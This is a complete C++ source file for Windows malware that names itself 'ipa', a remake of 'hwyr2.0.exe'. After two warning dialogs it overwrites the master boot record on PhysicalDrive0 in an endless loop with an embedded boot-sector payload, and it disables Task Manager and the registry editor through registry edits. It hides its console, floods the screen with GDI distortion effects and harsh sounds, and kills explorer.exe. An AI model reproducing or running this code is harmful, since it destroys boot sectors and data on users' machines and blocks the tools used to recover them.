#include <windows.h>
#include <tchar.h>
#include <ctime>
#include <iostream>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>
#define M_PI   3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) { //Credits to Void_/GetMBR
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}
const unsigned char MasterBootRecord[] = { 0xB8, 0x02, 0x00, 0xCD, 0x10, 0xFC, 0xB8, 0x00, 0xB8, 0x8E, 0xD8, 0x8E, 0xC0, 0xBF, 0xA0, 0x0F,
0x31, 0xC0, 0xAB, 0xAB, 0xAB, 0xB0, 0xA0, 0xAB, 0xB0, 0x60, 0xAB, 0xBF, 0x4A, 0x00, 0xB8, 0x46,
0x0F, 0xAB, 0xB0, 0x2D, 0xAB, 0xB0, 0x42, 0xAB, 0xB0, 0x49, 0xAB, 0xB0, 0x52, 0xAB, 0xB0, 0x44,
0xAB, 0xB9, 0x50, 0x00, 0x51, 0xE8, 0xFC, 0x00, 0x59, 0xE2, 0xF9, 0xB4, 0x01, 0xCD, 0x16, 0x9C,
0x31, 0xC0, 0xCD, 0x16, 0x9D, 0x75, 0xF4, 0xA0, 0xA8, 0x0F, 0x02, 0x06, 0xA4, 0x0F, 0xA2, 0xA8,
0x0F, 0x24, 0xF8, 0xB4, 0x14, 0xF6, 0xE4, 0x83, 0xC0, 0x20, 0x97, 0xA0, 0xAC, 0x0F, 0x24, 0x04,
0x74, 0x14, 0x8A, 0x85, 0x60, 0xFF, 0xC7, 0x85, 0x60, 0xFF, 0x1E, 0x0D, 0x02, 0x05, 0xD0, 0xE8,
0xC7, 0x05, 0x14, 0x0D, 0xEB, 0x06, 0x8A, 0x05, 0xC7, 0x05, 0x1F, 0x0D, 0x02, 0x45, 0x02, 0xC7,
0x45, 0x02, 0x10, 0x0D, 0x3C, 0x40, 0x74, 0x27, 0xC6, 0x05, 0x2A, 0xC6, 0x45, 0x02, 0x2A, 0xBF,
0xCA, 0x07, 0xB8, 0x42, 0x0F, 0xAB, 0xB0, 0x4F, 0xAB, 0xB0, 0x4E, 0xAB, 0xB0, 0x4B, 0xAB, 0xB0,
0x21, 0xAB, 0xB9, 0x64, 0x00, 0x51, 0xE8, 0x39, 0x01, 0x59, 0xE2, 0xF9, 0xE9, 0x5E, 0xFF, 0xE8,
0x30, 0x01, 0xA0, 0xAC, 0x0F, 0x24, 0x07, 0x75, 0x04, 0xFF, 0x06, 0xA4, 0x0F, 0xB0, 0x20, 0x88,
0x85, 0x60, 0xFF, 0x88, 0x45, 0x02, 0xAA, 0xE8, 0x6A, 0x00, 0xE8, 0x67, 0x00, 0x80, 0x3E, 0xA0,
0x00, 0xB0, 0x74, 0x05, 0x80, 0x3E, 0xA2, 0x00, 0xB0, 0x75, 0x21, 0xFF, 0x06, 0xA2, 0x0F, 0xA1,
0xA2, 0x0F, 0xBF, 0x8E, 0x00, 0x31, 0xD2, 0xBB, 0x0A, 0x00, 0xF7, 0xF3, 0x81, 0xC2, 0x30, 0x0C,
0x92, 0xFD, 0xAB, 0xC6, 0x05, 0x20, 0xFC, 0x92, 0x09, 0xC0, 0x75, 0xE9, 0xB4, 0x01, 0xCD, 0x16,
0x74, 0x2F, 0xB4, 0x00, 0xCD, 0x16, 0x3C, 0x1B, 0x75, 0x02, 0xCD, 0x20, 0xA1, 0xA8, 0x0F, 0x83,
0xE8, 0x10, 0x83, 0xF8, 0x08, 0x72, 0x03, 0xA3, 0xA8, 0x0F, 0xC6, 0x06, 0xA4, 0x0F, 0x00, 0xB0,
0xB6, 0xE6, 0x43, 0xB0, 0x90, 0xE6, 0x42, 0xB0, 0x4A, 0xE6, 0x42, 0xE4, 0x61, 0x0C, 0x03, 0xE6,
0x61, 0xE9, 0x13, 0xFF, 0xBE, 0xA2, 0x00, 0xBF, 0xA0, 0x00, 0xB9, 0x4F, 0x00, 0xF3, 0xA5, 0xB8,
0x20, 0x0E, 0xAB, 0xAD, 0x81, 0xFE, 0xA2, 0x0F, 0x75, 0xF0, 0xC7, 0x06, 0x9E, 0x0F, 0xDF, 0x02,
0xE4, 0x40, 0x24, 0x70, 0x74, 0x18, 0xBB, 0x08, 0x04, 0x89, 0x1E, 0xFE, 0x0E, 0xBF, 0x5E, 0x0E,
0x24, 0x20, 0x74, 0x06, 0x89, 0x1D, 0x81, 0xEF, 0xA0, 0x00, 0xC7, 0x05, 0x1E, 0x09, 0xFF, 0x0E,
0xA6, 0x0F, 0x8B, 0x1E, 0xA6, 0x0F, 0x83, 0xFB, 0x03, 0x77, 0x66, 0x75, 0x0A, 0xE4, 0x40, 0x83,
0xE0, 0x07, 0x04, 0x04, 0xA3, 0xAA, 0x0F, 0x8B, 0x0E, 0xAA, 0x0F, 0x09, 0xDB, 0xB2, 0xB0, 0x74,
0x09, 0xB2, 0xDB, 0x83, 0xFB, 0x03, 0x72, 0x02, 0xB2, 0xB1, 0xBF, 0x3E, 0x01, 0xB4, 0x0A, 0x88,
0xD0, 0xAB, 0x81, 0xC7, 0x9E, 0x00, 0xE2, 0xF9, 0xB0, 0xC4, 0xAB, 0x81, 0xC7, 0xBE, 0x03, 0xB0,
0xDF, 0xAB, 0x81, 0xC7, 0x9E, 0x00, 0x88, 0xD0, 0xAB, 0x81, 0xC7, 0x9E, 0x00, 0x81, 0xFF, 0x00,
0x0F, 0x72, 0xF3, 0x09, 0xDB, 0x75, 0x1A, 0xA1, 0xA0, 0x0F, 0x40, 0xA3, 0xA0, 0x0F, 0xB1, 0x03,
0xD3, 0xE8, 0xB4, 0x50, 0x28, 0xC4, 0x80, 0xFC, 0x10, 0x77, 0x02, 0xB4, 0x10, 0x88, 0x26, 0xA6,
0x0F, 0xC3, 0xB4, 0x00, 0xCD, 0x1A, 0x52, 0xB4, 0x00, 0xCD, 0x1A, 0x5B, 0x39, 0xD3, 0x74, 0xF6,
0xFF, 0x06, 0xAC, 0x0F, 0xE4, 0x61, 0x24, 0xFC, 0xE6, 0x61, 0xC3, 0x4F, 0x54, 0x47, 0x55, 0xAA };

DWORD WINAPI mbr(LPVOID lpParam) {
	while (1) {
		DWORD dwBytesWritten;
		HANDLE hDevice = CreateFileW(
			L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
			FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
			OPEN_EXISTING, 0, 0);

		WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
		CloseHandle(hDevice);
	}
}
DWORD WINAPI Disable(LPVOID lpParam) {
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");
	return 0;
}

DWORD WINAPI HSL3(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, NOTSRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int Xii = x ^ x, Yii = y * y;
				int inc = 1 + i;
				int fx = (Xii + Yii + inc | Xii + Yii + inc) + (i * 100);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 1500.f + y / h * .1f + i / 5000.f, 1.f);
				hslcolor.s = 0.7f;
				hslcolor.l = 0.5f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}
DWORD WINAPI HSL4(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, NOTSRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int Xii = x | x, Yii = y * y;
				int inc = 1 + i;
				int fx = (Xii + Yii + inc | Xii + Yii + inc) + (i * 100);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 1500.f + y / h * .1f + i / 5000.f, 1.f);
				hslcolor.s = 0.7f;
				hslcolor.l = 0.5f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}
DWORD WINAPI shader6(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, NOTSRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			int codelib = i + i;
			int code = codelib | x ^ y;
			rgbScreen[i].r += code;
			rgbScreen[i].g += code;
			rgbScreen[i].b += Hue(239) * codelib;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
		Sleep(1);
	}
}
DWORD WINAPI sines2(LPVOID lpParam) {
	HDC hdc = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	for (;;) {
		hdc = GetDC(0);
		for (float i = 0; i < sw + sh; i += 9.00f) {
			int a = sin(angle) * 15;
			BitBlt(hdc, i * 1.9, 0, 5, sh, hdc, i * 1.9, a * 9, SRCCOPY);
			angle += M_PI / 99;
			DeleteObject(&a); DeleteObject(&i);
		}
		ReleaseDC(wnd, hdc);
		DeleteDC(hdc); DeleteObject(wnd); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
	}
}
DWORD WINAPI sines3(LPVOID lpParam) {
	HDC hdc = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	for (;;) {
		hdc = GetDC(0);
		for (float i = 0; i < sw + sh; i += 3.00f) {
			int a = sin(angle) * 15;
			BitBlt(hdc, i * 1.9, 0, 5, sh, hdc, i * 1.9, a * 9, SRCCOPY);
			angle += M_PI / 99;
			DeleteObject(&a); DeleteObject(&i);
		}
		ReleaseDC(wnd, hdc);
		DeleteDC(hdc); DeleteObject(wnd); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
	}
}
DWORD WINAPI sines4(LPVOID lpParam) {
	HDC hdc = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	for (;;) {
		hdc = GetDC(0);
		for (float i = 0; i < sw + sh; i += 0.90f) {
			int a = sin(angle) * 15;
			BitBlt(hdc, i * 1.9, 0, 5, sh, hdc, i * 1.9, a * 9, SRCCOPY);
			angle += M_PI / 99;
			DeleteObject(&a); DeleteObject(&i);
		}
		ReleaseDC(wnd, hdc);
		DeleteDC(hdc); DeleteObject(wnd); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
	}
}
DWORD WINAPI HSL5(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, NOTSRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int Xii = x * x, Yii = y * y;
				int inc = 1 + i;
				int fx = (Xii + Yii + inc | Xii + Yii + inc) + (i * 100);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 1500000.f + y / h * .1f + i / 5.f, 1.f);
				hslcolor.s = 0.7f;
				hslcolor.l = 0.5f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}
VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> t) >> (t >> t) >> (t >> t);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char> (t >> t >> t) >> (t >> t >> t >> 5);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> t) >> (t >> t) >> (t >> 5);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
int main (){
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	if (MessageBoxW(NULL, L"WARNING!!!\r\n\You're about to run malware named ipa (iphone app lmao)\r\n\It can delete all your data\r\n\Click yes if you're currently running on virtual space\r\n\If you don't agree terms, press no NOW\r\n\Process with caution!!!", L"Talking-Tom-Cat-iOS_3.0.ipa (remake of hwyr2.0.exe)", MB_YESNO | MB_ICONWARNING) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"FINAL WARNING!!!\r\n\You're about to run malware named ipa\r\n\It can delete all your data\r\n\Click yes if you're currently running on virtual space\r\n\If you don't agree terms, press no NOW\r\n\If you running this on a real pc, it's will be YOUR FALUT!!! (nicokado avocado lmao XD)", L"LAST WARNING - Talking-Tom-Cat-iOS_3.0.ipa", MB_YESNO | MB_ICONWARNING) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			HANDLE thread1dot = CreateThread(0, 0, mbr, 0, 0, 0);
			HANDLE thread1dot2 = CreateThread(0, 0, Disable, 0, 0, 0);
			sound5();
			HANDLE thread9 = CreateThread(0, 0, HSL3, 0, 0, 0);
			Sleep(15000);
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			InvalidateRect(0, 0, 0);
			HANDLE thread10 = CreateThread(0, 0, HSL4, 0, 0, 0);
			Sleep(15000);
			TerminateThread(thread10, 0);
			CloseHandle(thread10);
			InvalidateRect(0, 0, 0);
			HANDLE thread11 = CreateThread(0, 0, shader6, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread11, 0);
			CloseHandle(thread11);
			InvalidateRect(0, 0, 0);
			sound6();
			HANDLE thread13 = CreateThread(0, 0, sines2, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread13, 0);
			CloseHandle(thread13);
			InvalidateRect(0, 0, 0);
			HANDLE thread14 = CreateThread(0, 0, sines3, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread14, 0);
			CloseHandle(thread14);
			InvalidateRect(0, 0, 0);
			HANDLE thread15 = CreateThread(0, 0, sines4, 0, 0, 0);
			sound7();
			Sleep(30000);
			system("taskkill /f /im explorer.exe");
			Sleep(50);
			InvalidateRect(0, 0, 0);
			system("taskkill /f /im explorer.exe");
			system("start winver.exe");
			ExitProcess(0);
		}
	}
}